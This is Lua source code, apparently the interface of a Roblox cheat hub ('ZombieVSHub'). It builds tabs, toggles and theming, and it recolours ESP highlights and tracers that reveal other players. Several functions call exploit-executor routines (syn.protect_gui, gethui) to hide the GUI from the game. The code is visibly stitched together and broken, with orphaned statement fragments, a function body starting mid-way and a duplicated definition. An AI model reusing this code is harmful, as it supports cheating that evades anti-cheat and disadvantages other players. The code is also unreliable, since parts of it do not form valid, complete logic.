COLORS.strokeSoft = Color3.new(col.R * 0.45 + 0.12, col.G * 0.45 + 0.12, col.B * 0.45 + 0.12) for _, s in ipairs(themeAccentStrokes) do
if s and s.Parent then pcall(function() s.Color = col end) end end if S._mainTryhardBorder and S._mainTryhardBorder.Parent then pcall(function() S._mainTryhardBorder.Color = col end) end if main then for _, d in ipairs(main:GetDescendants()) do if d:IsA("UIStroke") then if d:GetAttribute("ThemeAccent") or d:GetAttribute("ThemeStroke") then d.Color = col end elseif d:IsA("TextButton") then local isHubBtn = d:GetAttribute("ThemeButton") or d.Name == "KeybindButton" or d.Name:find("Btn") or d.Name:find("Button") or d.Name == "PickerPrev" or d.Name == "PickerNext" or d.Name == "PickerValue"
if isHubBtn and d.BackgroundTransparency < 1 then d.BackgroundColor3 = col; d.BackgroundTransparency = math.max(d.BackgroundTransparency, 0.5); local st = d:FindFirstChildOfClass("UIStroke") if st then st.Color = col end end elseif d:IsA("TextBox") then if d.BackgroundTransparency < 1 then local st = d:FindFirstChildOfClass("UIStroke") if st then st.Color = col end end elseif d:IsA("Frame") then if d:GetAttribute("ThemePillOn") then d.BackgroundColor3 = col; d.BackgroundTransparency = 0.22 end end end end pcall(function() if _G._VersincApplyMobileTheme then _G._VersincApplyMobileTheme(col) end
end) pcall(function() if PlayerESP and PlayerESP.playerData then for _, d in pairs(PlayerESP.playerData) do if d.highlight then d.highlight.FillColor = col; d.highlight.OutlineColor = col end if d.billboard then local lbl = d.billboard:FindFirstChildWhichIsA("TextLabel") if lbl then lbl.TextColor3 = col end end end end if TracerESP and TracerESP.drawings then for _, d in pairs(TracerESP.drawings) do if d.line then d.line.BackgroundColor3 = col end end end local legacy = workspace:FindFirstChild("VersincTracers") if legacy then for _, ch in ipairs(legacy:GetDescendants()) do
if ch:IsA("Beam") then ch.Color = ColorSequence.new(col) end end end end) end _G._VersincApplyTheme = function(themeName) for _, preset in ipairs(THEME_PRESETS) do if preset.name == themeName then applyThemeColor(preset.color, preset.name) return end end end local function corner(parent, radius) local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, radius or 8); c.Parent = parent return c end local function stroke(parent, color, thickness, transparency)
local s = Instance.new("UIStroke"); s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Color = color or COLORS.stroke; s.Thickness = thickness or 1; s.Transparency = transparency or 0.55; s.Parent = parent if color == nil or color == COLORS.stroke or color == COLORS.accent then s:SetAttribute("ThemeAccent", true); table.insert(themeAccentStrokes, s) end return s end for _,name in ipairs({"ZombieVSHub","CursedHub"}) do local old = game:GetService("CoreGui"):FindFirstChild(name) if old then old:Destroy() end local pg = LP:FindFirstChild("PlayerGui")
if pg then local o = pg:FindFirstChild(name); if o then o:Destroy() end end end local gui = Instance.new("ScreenGui"); F.registerWaveThemeRoot(gui); gui.Name = "ZombieVSHub"; gui.ResetOnSpawn = false; gui.DisplayOrder = 10; gui.IgnoreGuiInset = true; gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling pcall(function() if type(syn) == "table" and type(syn.protect_gui) == "function" then syn.protect_gui(gui) elseif type(protect_gui) == "function" then protect_gui(gui) elseif type(protectgui) == "function" then protectgui(gui) end end) local parented = false pcall(function() if type(gethui) == "function" then
gui.Parent = gethui(); parented = gui.Parent ~= nil end end) if not parented then pcall(function() local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 8) if pg then gui.Parent = pg; parented = gui.Parent ~= nil end end) end if not parented then pcall(function() gui.Parent = game:GetService("CoreGui") parented = gui.Parent ~= nil end) end if not parented then warn("[Zombie.Vs] Failed to parent ScreenGui") end
local FULL_SIZE = UDim2.new(0, 356, 0, 536); main = Instance.new("Frame"); main.Name = "MainOuter"; main.AnchorPoint = Vector2.new(0.5, 0.5); main.Size = FULL_SIZE; main.Position = UDim2.new(0.5, 0, 0.5, 0) do local isMob = false pcall(function() isMob = UIS.TouchEnabled and not UIS.KeyboardEnabled end) local cam = workspace.CurrentCamera local vp = cam and cam.ViewportSize or Vector2.new(1280, 720) if vp.X < 700 or vp.Y < 500 then isMob = true end if isMob then
main.AnchorPoint = Vector2.new(0.5, 0.5); main.Position = UDim2.new(0.5, 0, 0.5, 0); local sc = Instance.new("UIScale"); sc.Name = "MobileHubScale"; sc.Scale = math.clamp(math.min(vp.X / 400, vp.Y / 620), 0.72, 0.92); sc.Parent = main end end main.BackgroundColor3 = Color3.fromRGB(8, 18, 48); main.BackgroundTransparency = 0; main.BorderSizePixel = 0; main.Active = true; main.ClipsDescendants = true; main.Parent = gui; corner(main, 20); local mainBorder = stroke(main, COLORS.stroke, 1.2, 1); mainBorder.Name = "TryhardBorder"; mainBorder:SetAttribute("ThemeAccent", true)
mainBorder:SetAttribute("TryhardBorder", true); S._mainTryhardBorder = mainBorder bgAsset = Instance.new("ImageLabel")
bgAsset.Name = "BackgroundAsset"; bgAsset.Size = UDim2.new(1, 0, 1, 0); bgAsset.BackgroundTransparency = 1; bgAsset.Image = "rbxassetid://130935005587354"; bgAsset.ImageTransparency = 0.55; bgAsset.ScaleType = Enum.ScaleType.Crop; bgAsset.ZIndex = 0; bgAsset.Parent = main; corner(bgAsset, 20); bgVeil = Instance.new("Frame"); bgVeil.Name = "BackgroundVeil"; bgVeil.Size = UDim2.new(1, 0, 1, 0); bgVeil.BackgroundColor3 = COLORS.bg; bgVeil.BackgroundTransparency = 0.45; bgVeil.BorderSizePixel = 0; bgVeil.ZIndex = 1; bgVeil.Parent = main; corner(bgVeil, 20); local guiScale = 1.0; local uiScaleObj = Instance.new("UIScale"); uiScaleObj.Scale = guiScale; uiScaleObj.Parent = main
local function applyProgressBarScale(n) S.progressBarScale = math.clamp(math.floor((tonumber(n) or 100) + 0.5), 50, 200); local pb = _G.__VersincProgressBarScaleObj if pb then pb.Scale = 0.7*(S.progressBarScale / 100) end if _G.__VersincProgressBarSizeLbl then _G.__VersincProgressBarSizeLbl.Text = tostring(S.progressBarScale) .. "%" end if UI.stealBarScaleLbl then UI.stealBarScaleLbl.Text = tostring(S.progressBarScale) .. "%" end end _G._VersincApplyProgressBarScale = applyProgressBarScale local function applyGuiScale(v) v = math.clamp(tonumber(v) or 1, 0.6, 1.6); guiScale = math.floor(v * 100 + 0.5) / 100; uiScaleObj.Scale = guiScale; S.uiScaleValue = math.floor(guiScale * 100 + 0.5)
pcall(function() if _G._VersincApplyProgressBarScale then _G._VersincApplyProgressBarScale(S.progressBarScale or 100) end end) if UI.guiScaleLbl then UI.guiScaleLbl.Text = string.format("%.0f%%", guiScale * 100) end pcall(F.saveConfig) return guiScale end _G._VersincApplyGuiScale = applyGuiScale _G._VersincGetGuiScale = function() return guiScale end local function _packPos(p) return { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset } end local function _unpackPos(t) if type(t) ~= "table" then return nil end
return UDim2.new(tonumber(t.xs) or 0, tonumber(t.xo) or 0, tonumber(t.ys) or 0, tonumber(t.yo) or 0) end _G._VersincSetHubPos = function(hub, mini) local a = _unpackPos(hub) if a and main then main.Position = a end local b = _unpackPos(mini) if b and _G.__VersincMiniBtn then _G.__VersincMiniBtn.Position = b end end do local dn, ds, sp, di = false main.InputBegan:Connect(function(i) if S.guiLocked == true then return end if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dn = true; ds = i.Position; sp = main.Position
i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then if dn then dn = false end end end) end end) main.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end) UIS.InputChanged:Connect(function(i) if i == di and dn then if S.guiLocked == true then dn = false; return end main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + (i.Position.X - ds.X), sp.Y.Scale, sp.Y.Offset + (i.Position.Y - ds.Y))
end end) end local miniBtn = Instance.new("TextButton"); miniBtn.Name = "ZOMBIEMini"; miniBtn.AutoButtonColor = false; miniBtn.Size = UDim2.new(0, 64, 0, 84); miniBtn.Position = UDim2.new(0, 14, 0, 72); miniBtn.BackgroundTransparency = 1; miniBtn.BorderSizePixel = 0; miniBtn.Text = ""; miniBtn.Visible = false; miniBtn.ZIndex = 40; miniBtn.Parent = gui
local miniCircle = Instance.new("Frame"); miniCircle.Name = "MiniCircle"; miniCircle.Size = UDim2.new(0, 56, 0, 56); miniCircle.Position = UDim2.new(0.5, -28, 0, 0); miniCircle.BackgroundColor3 = Color3.fromRGB(6, 12, 20); miniCircle.BorderSizePixel = 0; miniCircle.ZIndex = 41; miniCircle.Active = false; miniCircle.Parent = miniBtn; Instance.new("UICorner", miniCircle).CornerRadius = UDim.new(1, 0)
do local st = Instance.new("UIStroke", miniCircle); st.Color = Color3.fromRGB(40, 150, 255); st.Thickness = 2; st.Transparency = 0.08; st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border end
local miniImg = Instance.new("ImageLabel"); miniImg.Name = "MiniBg"; miniImg.Size = UDim2.new(1, 0, 1, 0); miniImg.BackgroundTransparency = 1; miniImg.BorderSizePixel = 0; miniImg.ScaleType = Enum.ScaleType.Crop; miniImg.Image = "rbxassetid://73023682914801"; miniImg.ZIndex = 42; miniImg.Parent = miniCircle; Instance.new("UICorner", miniImg).CornerRadius = UDim.new(1, 0)
local miniLbl = Instance.new("TextLabel"); miniLbl.Size = UDim2.new(1, 0, 0, 18); miniLbl.Position = UDim2.new(0, 0, 0, 58); miniLbl.BackgroundTransparency = 1; miniLbl.Text = "ZOMBIE"; miniLbl.TextColor3 = Color3.fromRGB(40, 160, 255); miniLbl.Font = Enum.Font.GothamBlack; miniLbl.TextSize = 12; miniLbl.TextStrokeTransparency = 0.3; miniLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0); miniLbl.ZIndex = 43; miniLbl.Parent = miniBtn
miniBtn.MouseEnter:Connect(function() TS:Create(miniCircle, TweenInfo.new(0.1), { Size = UDim2.new(0, 60, 0, 60), Position = UDim2.new(0.5, -30, 0, -2) }):Play() end) miniBtn.MouseLeave:Connect(function() TS:Create(miniCircle, TweenInfo.new(0.1), { Size = UDim2.new(0, 56, 0, 56), Position = UDim2.new(0.5, -28, 0, 0) }):Play() end) _G.__VersincMiniBtn = miniBtn if type(S.miniPos) == "table" then pcall(function() miniBtn.Position = _unpackPos(S.miniPos) or miniBtn.Position end) end do local dn, ds, sp = false miniBtn.InputBegan:Connect(function(i) if S.guiLocked == true then return end
if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dn = true; ds = i.Position; sp = miniBtn.Position i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End and dn then dn = false; S.miniPos = _packPos(miniBtn.Position) pcall(function() F.saveConfig(true) end) end end) end end) UIS.InputChanged:Connect(function(i) if dn and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then if S.guiLocked == true then dn = false; return end
miniBtn.Position = UDim2.new(sp.X.Scale, sp.X.Offset + (i.Position.X - ds.X), sp.Y.Scale, sp.Y.Offset + (i.Position.Y - ds.Y)) end end) end local mainUIScale = main:FindFirstChildOfClass("UIScale") or Instance.new("UIScale", main) local function _targetScale() local v = (_G._VersincGetGuiScale and _G._VersincGetGuiScale()) or ((tonumber(S.uiScaleValue) or 100) / 100) return math.clamp(tonumber(v) or 1, 0.5, 1.5) end local function showGui() if not main then return end
main.Visible = true; main.BackgroundTransparency = 0; mainUIScale.Scale = 0.85; TS:Create(mainUIScale, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Scale = _targetScale() }):Play(); miniBtn.Visible = false pcall(function() local pg = LP:FindFirstChild("PlayerGui") local g = pg and pg:FindFirstChild("VersincMobileButtons") if g then g.Enabled = not (S.hideMobileButtons == true) end end) end local function hideGui() if not main then return end TS:Create(mainUIScale, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Scale = 0.85 }):Play()
task.delay(0.2, function() if main then main.Visible = false end if miniBtn then miniBtn.Visible = true end end) pcall(function() if F.applyMobileButtonsHidden then F.applyMobileButtonsHidden() end end) end miniBtn.MouseButton1Click:Connect(showGui); local waveHeader = Instance.new("Frame", main); waveHeader.Name = "HeaderBar"; waveHeader.Size = UDim2.new(1,0,0,48); waveHeader.BackgroundColor3 = Color3.fromRGB(5,12,35); waveHeader.BorderSizePixel = 0; waveHeader.ZIndex = 4; corner(waveHeader,20)
local avatarBg = Instance.new("Frame"); avatarBg.Size = UDim2.new(0,28,0,28); avatarBg.Position = UDim2.new(0,12,0,10); avatarBg.BackgroundColor3 = COLORS.row2; avatarBg.BorderSizePixel = 0
avatarBg.ZIndex = 6; avatarBg.Parent = main; corner(avatarBg, 18); stroke(avatarBg, COLORS.stroke, 1.4, 0.35); local avatarImg = Instance.new("ImageLabel"); avatarImg.Size = UDim2.new(1, -4, 1, -4); avatarImg.Position = UDim2.new(0, 2, 0, 2); avatarImg.BackgroundTransparency = 1; avatarImg.Image = ""; avatarImg.ScaleType = Enum.ScaleType.Crop; avatarImg.ZIndex = 7; avatarImg.Parent = avatarBg; corner(avatarImg, 16) }; ok = __m[1]; thumb = __m[2]; end
if ok and thumb then avatarImg.Image = thumb end end) LP.CharacterAdded:Connect(function() }; ok = __m[1]; thumb = __m[2]; end if ok and thumb then avatarImg.Image = thumb end end) end) local title = Instance.new("TextLabel")
title.BackgroundTransparency = 1; title.Size = UDim2.new(0,140,0,28); title.Position = UDim2.new(0,48,0,10); title.Text = "ZOMBIE"; title.TextColor3 = COLORS.accent; title.Font = Enum.Font.GothamBlack; title.TextSize = 15; title.TextXAlignment = Enum.TextXAlignment.Left; title.ZIndex = 6; title.Parent = main; local subTitle = Instance.new("TextLabel"); subTitle.BackgroundTransparency = 1; subTitle.Size = UDim2.new(1, -100, 0, 14); subTitle.Position = UDim2.new(0, 58, 0, 34); subTitle.Text = ""; subTitle.TextColor3 = COLORS.textDim; subTitle.Font = Enum.Font.GothamMedium; subTitle.TextSize = 11; subTitle.TextXAlignment = Enum.TextXAlignment.Left; subTitle.ZIndex = 6; subTitle.Parent = main; local statsLbl = Instance.new("TextLabel"); statsLbl.Name = "FpsPingStats"; statsLbl.BackgroundTransparency = 1; statsLbl.Size = UDim2.new(0, 110, 0, 28); statsLbl.Position = UDim2.new(1, -150, 0, 16)
statsLbl.Text = "FPS --  ·  -- ms" statsLbl.TextColor3 = COLORS.textDim; statsLbl.Font = Enum.Font.GothamBold; statsLbl.TextSize = 11; statsLbl.TextXAlignment = Enum.TextXAlignment.Right; statsLbl.ZIndex = 7; statsLbl.Parent = main; UI.statsLbl = statsLbl  if pingN == 0 then pcall(function() pingN = math.floor((Stats.Network:FindFirstChild("ServerStatsItem") and 0) or 0) end) end if pingN == 0 then pcall(function() if LP.GetNetworkPing then
pingN = math.floor(LP:GetNetworkPing() * 1000 + 0.5) end end) end local fpsCol = fpsN >= 55 and "g" or (fpsN >= 30 and "w" or "r") if statsLbl and statsLbl.Parent then statsLbl.Text = string.format("FPS %d  ·  %d ms", fpsN, pingN) if fpsN >= 55 and pingN < 120 then statsLbl.TextColor3 = Color3.fromRGB(100, 220, 160) elseif fpsN < 30 or pingN > 200 then statsLbl.TextColor3 = Color3.fromRGB(255, 110, 120) else statsLbl.TextColor3 = COLORS.textDim end end end end) end) local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0,22,0,22); closeBtn.Position = UDim2.new(1,-30,0,13); closeBtn.BackgroundColor3 = COLORS.row2; closeBtn.BackgroundTransparency = 0.15; closeBtn.Text = "-"; closeBtn.TextColor3 = COLORS.accent; closeBtn.Font = Enum.Font.GothamBlack; closeBtn.TextSize = 16; closeBtn.BorderSizePixel = 0; closeBtn.ZIndex = 8; closeBtn.Parent = main; corner(closeBtn, 7)
stroke(closeBtn, COLORS.strokeSoft, 1, 0.45); closeBtn.MouseButton1Click:Connect(hideGui); local headerDiv = Instance.new("Frame"); headerDiv.Size = UDim2.new(1, -32, 0, 1); headerDiv.Position = UDim2.new(0,16,0,48); headerDiv.BackgroundColor3 = COLORS.stroke
headerDiv.BackgroundTransparency = 0.55; headerDiv.BorderSizePixel = 0; headerDiv.ZIndex = 5; headerDiv.Parent = main; local pages = {}; local pageHolder = Instance.new("Frame"); pageHolder.Size = UDim2.new(1,-3,1,-92); pageHolder.Position = UDim2.new(0,3,0,92); pageHolder.BackgroundTransparency = 1; pageHolder.ClipsDescendants = true; pageHolder.ZIndex = 3; pageHolder.Parent = main local function makePage(name)
local sf = Instance.new("ScrollingFrame"); sf.Name = name; sf.Size = UDim2.new(1, 0, 1, 0); sf.BackgroundTransparency = 1; sf.BorderSizePixel = 0; sf.ScrollBarThickness = 3; sf.ScrollBarImageColor3 = COLORS.accent; sf.CanvasSize = UDim2.new(0, 0, 0, 0); sf.AutomaticCanvasSize = Enum.AutomaticSize.Y; sf.Visible = false; sf.ZIndex = 3; sf.Parent = pageHolder; local ll = Instance.new("UIListLayout", sf); ll.SortOrder = Enum.SortOrder.LayoutOrder; ll.Padding = UDim.new(0, 0); local pad = Instance.new("UIPadding", sf); pad.PaddingTop = UDim.new(0, 6); pad.PaddingBottom = UDim.new(0, 12); pad.PaddingLeft = UDim.new(0, 8); pad.PaddingRight = UDim.new(0, 8); sf.ScrollBarImageTransparency = 0.5; pages[name] = sf
return sf end
MVPUI = MVPUI or {}
function MVPUI.new(class, parent, props)
    local object = Instance.new(class)
    for key, value in pairs(props or {}) do object[key] = value end
    object.Parent = parent
    return object
end
function MVPUI.round(object, radius)
    local corner = object:FindFirstChildOfClass("UICorner") or Instance.new("UICorner", object)
    corner.CornerRadius = UDim.new(0, radius or 12)
    return corner
end
function MVPUI.stroke(object, color, transparency, thickness)
    return MVPUI.new("UIStroke", object, {Color = color, Transparency = transparency or 0,
        Thickness = thickness or 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
end
function MVPUI.pumpkin(parent, position, size, z)
    local root = MVPUI.new("Frame", parent, {Name = "Pumpkin", Size = UDim2.fromOffset(size, size),
        Position = position, BackgroundTransparency = 1, ZIndex = z, Active = false})
    local function part(x, y, w, h, color, radius, rotation)
        local object = MVPUI.new("Frame", root, {Size = UDim2.fromScale(w, h), Position = UDim2.fromScale(x, y),
            BackgroundColor3 = color, BorderSizePixel = 0, Rotation = rotation or 0, ZIndex = z + 1})
        MVPUI.round(object, radius)
        return object
    end
    part(0.42, 0.02, 0.12, 0.23, Color3.fromRGB(112, 125, 65), 3, 16)
    part(0.04, 0.22, 0.92, 0.68, Color3.fromRGB(164, 64, 24), size)
    part(0.09, 0.20, 0.52, 0.70, Color3.fromRGB(246, 115, 37), size)
    part(0.40, 0.20, 0.51, 0.70, Color3.fromRGB(222, 88, 27), size)
    local lobe = part(0.29, 0.17, 0.43, 0.75, Color3.fromRGB(255, 156, 63), size)
    MVPUI.new("UIGradient", lobe, {Rotation = 90, Color = ColorSequence.new(
        Color3.fromRGB(255, 212, 130), Color3.fromRGB(218, 96, 32))})
    part(0.24, 0.38, 0.16, 0.12, Color3.fromRGB(33, 20, 17), 2, -20)
    part(0.61, 0.38, 0.16, 0.12, Color3.fromRGB(33, 20, 17), 2, 20)
    part(0.33, 0.65, 0.35, 0.10, Color3.fromRGB(44, 24, 17), 3)
    part(0.43, 0.62, 0.06, 0.08, Color3.fromRGB(255, 173, 80), 1)
    part(0.55, 0.68, 0.06, 0.08, Color3.fromRGB(255, 173, 80), 1)
    return root
end
function MVPUI.web(parent, position, size, z)
    local root = MVPUI.new("Frame", parent, {Name = "Web", Position = position,
        Size = UDim2.fromOffset(size, size), BackgroundTransparency = 1, ZIndex = z})
    local function line(x1, y1, x2, y2)
        local dx, dy = x2 - x1, y2 - y1
        MVPUI.new("Frame", root, {Size = UDim2.fromOffset(math.sqrt(dx * dx + dy * dy), 1),
            Position = UDim2.fromOffset((x1 + x2) / 2, (y1 + y2) / 2), AnchorPoint = Vector2.new(0.5, 0.5),
            Rotation = math.deg(math.atan2(dy, dx)), BackgroundColor3 = Color3.fromRGB(220, 174, 128),
            BackgroundTransparency = 0.84, BorderSizePixel = 0, ZIndex = z})
    end
    for i = 0, 4 do
        local a = math.pi * i / 8
        line(0, 0, math.cos(a) * size, math.sin(a) * size)
    end
    for ring = 1, 3 do
        local r = size * ring / 3
        for i = 0, 3 do
            local a, b = math.pi * i / 8, math.pi * (i + 1) / 8
            line(math.cos(a) * r, math.sin(a) * r, math.cos(b) * r, math.sin(b) * r)
        end
    end
    return root
end
function MVPUI.sectionIcon(parent, name, position, size, color, z)
    local root = MVPUI.new("Frame", parent, {Name = "SectionIcon", Position = position,
        Size = UDim2.fromOffset(size, size), BackgroundTransparency = 1, ZIndex = z})
    local function line(x1, y1, x2, y2, thickness)
        local dx, dy = x2 - x1, y2 - y1
        local ink = MVPUI.new("Frame", root, {Name = "IconInk", AnchorPoint = Vector2.new(0.5, 0.5),
            Position = UDim2.fromScale((x1 + x2) / 2, (y1 + y2) / 2),
            Size = UDim2.fromOffset(math.sqrt(dx * dx + dy * dy) * size, thickness or 1.6),
            BackgroundColor3 = color, BorderSizePixel = 0, Rotation = math.deg(math.atan2(dy, dx)), ZIndex = z})
        MVPUI.round(ink, 2)
    end
    local function box(x, y, w, h, radius, solid)
        local object = MVPUI.new("Frame", root, {Name = "IconInk", Position = UDim2.fromScale(x, y),
            Size = UDim2.fromScale(w, h), BackgroundColor3 = color, BackgroundTransparency = solid and 0 or 1,
            BorderSizePixel = 0, ZIndex = z})
        MVPUI.round(object, radius)
        if not solid then MVPUI.stroke(object, color, 0, 1.4) end
        return object
    end
    if name == "Speed" then
        line(0.18, 0.22, 0.44, 0.5); line(0.44, 0.5, 0.18, 0.78)
        line(0.52, 0.22, 0.79, 0.5); line(0.79, 0.5, 0.52, 0.78)
    elseif name == "Custom" then
        line(0.5, 0.1, 0.83, 0.24); line(0.83, 0.24, 0.78, 0.62)
        line(0.78, 0.62, 0.5, 0.88); line(0.5, 0.88, 0.22, 0.62)
        line(0.22, 0.62, 0.17, 0.24); line(0.17, 0.24, 0.5, 0.1)
        line(0.36, 0.47, 0.47, 0.58); line(0.47, 0.58, 0.66, 0.37)
    elseif name == "Visual" then
        box(0.15, 0.15, 0.27, 0.27, 2, false)
        box(0.58, 0.15, 0.27, 0.27, 2, true)
        box(0.15, 0.58, 0.27, 0.27, 2, true)
        box(0.58, 0.58, 0.27, 0.27, 2, false)
    elseif name == "Settings" then
        line(0.5, 0.13, 0.82, 0.3); line(0.82, 0.3, 0.82, 0.77)
        line(0.82, 0.77, 0.18, 0.77); line(0.18, 0.77, 0.18, 0.3)
        line(0.18, 0.3, 0.5, 0.13); line(0.18, 0.3, 0.82, 0.3)
        line(0.5, 0.39, 0.5, 0.67); line(0.37, 0.54, 0.5, 0.67); line(0.63, 0.54, 0.5, 0.67)
    elseif name == "Keybinds" then
        box(0.08, 0.22, 0.84, 0.56, 3, false)
        box(0.2, 0.37, 0.12, 0.12, 1, true)
        box(0.44, 0.37, 0.12, 0.12, 1, true)
        box(0.68, 0.37, 0.12, 0.12, 1, true)
        line(0.29, 0.64, 0.71, 0.64)
    end
    return root
end
function MVPUI.colorSectionIcon(root, color)
    if not root then return end
    for _, object in ipairs(root:GetDescendants()) do
        if object:IsA("Frame") and object.Name == "IconInk" then object.BackgroundColor3 = color end
        if object:IsA("UIStroke") then object.Color = color end
    end
end

function MVPUI.colorSectionIcon(root, color)
    if not root then return end
    for _, object in ipairs(root:GetDescendants()) do
        if object:IsA("Frame") and object.Name == "IconInk" then object.BackgroundColor3 = color end
        if object:IsA("UIStroke") then object.Color = color end
    end
end

local pageMOVE = makePage("MOVEMENT"); local pageTOOLS = makePage("COMBAT"); local pageVIEW = makePage("VISUALS"); local pageSYS = makePage("SETTINGS"); local pageKEYS = makePage("KEYBINDS")
local Tabs = Instance.new("Frame", main); Tabs.Name = "WaveNavigation"; Tabs.BackgroundTransparency = 1; Tabs.Position = UDim2.new(0,8,0,51); Tabs.Size = UDim2.new(1,-16,0,40); Tabs.ZIndex = 6
local TabLayout = Instance.new("UIListLayout", Tabs); TabLayout.FillDirection = Enum.FillDirection.Horizontal; TabLayout.Padding = UDim.new(0,4); TabLayout.VerticalAlignment = Enum.VerticalAlignment.Center; TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center; TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
local tabNames = {"MOVEMENT","COMBAT","VISUALS","SETTINGS","KEYBINDS"}
local tabDisplay = {MOVEMENT="MAIN", COMBAT="COMBAT", VISUALS="VISUALS", SETTINGS="UI", KEYBINDS="KEYBINGS"}
local tabButtons = {}; local activeTab = "MOVEMENT"
local function setTab(name)
    activeTab = name
    for n, pg in pairs(pages) do pg.Visible = n == name end
    for n, btn in pairs(tabButtons) do
        local on = n == name
        TS:Create(btn, TweenInfo.new(0.16), {BackgroundTransparency=on and 0 or 0.22, BackgroundColor3=on and Color3.fromRGB(20,72,160) or COLORS.bg, TextColor3=on and Color3.fromRGB(240,245,255) or COLORS.textDim}):Play()
        local st = btn:FindFirstChild("TabStroke")
        if st then st.Color = on and COLORS.accent or COLORS.strokeSoft; st.Thickness = on and 1.2 or 1 end
    end
end
for i, name in ipairs(tabNames) do
    local btn = Instance.new("TextButton", Tabs); btn.Name = name; btn.Size = UDim2.new(0,60,0,28); btn.LayoutOrder = i; btn.BackgroundColor3 = COLORS.bg; btn.BorderSizePixel = 0; btn.Text = tabDisplay[name]; btn.TextSize = 10; btn.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json",Enum.FontWeight.Heavy,Enum.FontStyle.Normal); btn.TextColor3 = COLORS.textDim; btn.AutoButtonColor = false; btn.ZIndex = 7; corner(btn,7)
    local st = stroke(btn,COLORS.strokeSoft,1,0); st.Name = "TabStroke"
    btn.Activated:Connect(function() setTab(name) end); tabButtons[name] = btn
end
setTab("MOVEMENT"); local lo = 0
local function LO() lo = lo + 1; return lo end local function section(parent, text) local f = Instance.new("Frame", parent); f.Size = UDim2.new(1, 0, 0, 28); f.BackgroundTransparency = 1; f.LayoutOrder = LO(); local l = Instance.new("TextLabel", f); l.Size = UDim2.new(1, -14, 1, 0); l.Position = UDim2.new(0, 8, 0, 0); l.BackgroundTransparency = 1; l.Text = text:upper(); l.TextColor3 = Color3.fromRGB(45, 130, 230); l.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json",Enum.FontWeight.Heavy,Enum.FontStyle.Normal); l.TextSize = 13; l.TextXAlignment = Enum.TextXAlignment.Left return f end local function mkRow(parent, h)
local f = Instance.new("Frame", parent); f.Size = UDim2.new(1, 0, 0, math.max(h or 38, 38)); f.BackgroundColor3 = Color3.fromRGB(10, 22, 55); f.BackgroundTransparency = 1; f.BorderSizePixel = 0; f.LayoutOrder = LO() return f end local function mkLabel(row, txt)
local l = Instance.new("TextLabel", row); l.Size = UDim2.new(0.58, 0, 1, 0); l.Position = UDim2.new(0, 12, 0, 0); l.BackgroundTransparency = 1; l.Text = txt; l.TextColor3 = Color3.fromRGB(225, 230, 240); l.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json",Enum.FontWeight.Heavy,Enum.FontStyle.Normal); l.TextSize = 11; l.TextXAlignment = Enum.TextXAlignment.Left return l end local function mkPill(row, offset) local pill = Instance.new("Frame", row); pill.Name = "WaveTogglePill"; pill.Size = UDim2.new(0, 40, 0, 18); pill.Position = UDim2.new(1, -(offset or 54), 0.5, -9); pill.BackgroundColor3 = Color3.fromRGB(12, 22, 55); pill.BorderSizePixel = 0; pill.ZIndex = 7
corner(pill, 9); do local ps = Instance.new("UIStroke", pill); ps.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; ps.Color = Color3.fromRGB(22, 52, 100) end; local dot = Instance.new("Frame", pill); dot.Name = "WaveToggleDot"; dot.Size = UDim2.new(0, 12, 0, 12); dot.Position = UDim2.new(0, 3, 0.5, -6); dot.BackgroundColor3 = Color3.fromRGB(20, 40, 80); dot.BorderSizePixel = 0 dot.ZIndex = 8; corner(dot, 6) return pill, dot end local function animPill(pill, dot, on) local onCol = S.themeColor or COLORS.on or Color3.fromRGB(220, 220, 225) if on then pill:SetAttribute("ThemePillOn", true) else pill:SetAttribute("ThemePillOn", false) end TS:Create(pill, TweenInfo.new(0.16, Enum.EasingStyle.Quad), { BackgroundColor3 = on and Color3.fromRGB(20, 72, 160) or Color3.fromRGB(12, 22, 55),
BackgroundTransparency = 0 }):Play() TS:Create(dot, TweenInfo.new(0.16, Enum.EasingStyle.Back), { Position = on and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6), BackgroundColor3 = on and Color3.fromRGB(240, 245, 255) or Color3.fromRGB(20, 40, 80) }):Play() end local function mkToggle(parent, txt, cb) local row = mkRow(parent, 40); mkLabel(row, txt); local pill, dot; do local __m = {mkPill(row, 54)}; pill = __m[1]; dot = __m[2]; end; local on = false local function sv(s) on = s; animPill(pill, dot, s) end
local clk = Instance.new("TextButton", pill); clk.Size = UDim2.new(1, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 6 clk.Activated:Connect(function() if S._anyKeyListening then return end on = not on; sv(on); if cb then cb(on) end end) return sv end local function mkBox(parent, default, w, xOff, cb)
